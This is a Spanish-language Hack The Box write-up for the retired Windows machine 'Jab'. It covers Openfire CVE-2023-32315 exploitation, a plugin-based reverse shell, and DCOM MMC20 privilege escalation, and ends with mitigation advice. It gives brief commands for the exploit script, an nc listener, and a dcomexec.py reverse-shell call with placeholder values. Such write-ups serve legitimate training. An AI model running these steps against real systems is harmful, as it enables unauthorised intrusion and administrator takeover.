---
machine: Jab
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, ad, openfire, xmpp, dcom, bloodhound]
---

# Jab — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Openfire 4.7.5 es vulnerable a CVE-2023-32315: se crea un usuario administrador y se sube un plugin que ejecuta código como `svc_openfire`. En el servidor XMPP se descubre una sala con credenciales y una cuenta Kerberoasteable. BloodHound muestra privilegios DCOM de primer grado para `svc_openfire`, y `dcomexec.py` con el objeto MMC20 permite ejecutar como administrator.

## Reconocimiento

```bash
nmap -Pn -sCV -p53,88,389,445,5222,5269,7070,7443,5985 <IP>
```

- `53/88/389/445` confirman un DC de `jab.htb`.
- `5222/5269` son XMPP y `7070/7443` la consola HTTP de Openfire.
- La versión de Openfire es 4.7.5, anterior a la corrección de CVE-2023-32315.

## Enumeración

- CVE-2023-32315 permite crear un usuario administrador mediante un bypass de autenticación.
- El panel permite subir plugins; un plugin malicioso ejecuta comandos como `svc_openfire`.
- En el servidor XMPP hay una sala con conversaciones sobre un pentest y credenciales de `jmontgomery`.

## Foothold

Se explota CVE-2023-32315 para crear el usuario admin, se sube un plugin Openfire con una reverse shell y se obtiene una shell como `svc_openfire`.

```bash
python3 CVE-2023-32315.py -t http://<IP>:9090
# login con el usuario creado y subir plugin
nc -lnvp 443
```

## Movimiento lateral

Las credenciales de `svc_openfire` se validan por SMB. Con BloodHound se ve que la cuenta tiene privilegios DCOM de primer grado, lo que permite ejecutar comandos de forma remota sin ser administrador local.

## Escalada de privilegios

Se usa `dcomexec.py` con el objeto `MMC20` y `-silentcommand` para lanzar una reverse shell. El proceso se ejecuta como administrator.

```bash
dcomexec.py jab.htb/svc_openfire:'<PASSWORD>'@<IP>   'powershell -e <BASE64_REVSHELL>' -silentcommand -object MMC20
```

## Evidencia

- Openfire 4.7.5 y usuario admin creado con CVE-2023-32315.
- Shell como `svc_openfire` y credenciales en XMPP.
- DCOM con MMC20 y shell como administrator.

## Lecciones aprendidas

- Un servidor de mensajería es una fuente de credenciales y contexto.
- Los privilegios DCOM pueden equivaler a ejecución remota sin admin local.
- Un plugin de administración malicioso es una vía directa a RCE.

## Mitigación y detección

- Actualizar Openfire y restringir su consola.
- Revisar ACLs DCOM y privilegios de cuentas de servicio.
- Auditar la creación de usuarios y la subida de plugins.

## Referencias

- [0xdf — Jab](https://0xdf.gitlab.io/2024/06/29/htb-jab.html)
- [IppSec — Jab](https://www.youtube.com/watch?v=tprP-GDW_6c)
- [Hack The Box — Jab](https://app.hackthebox.com/machines/jab)
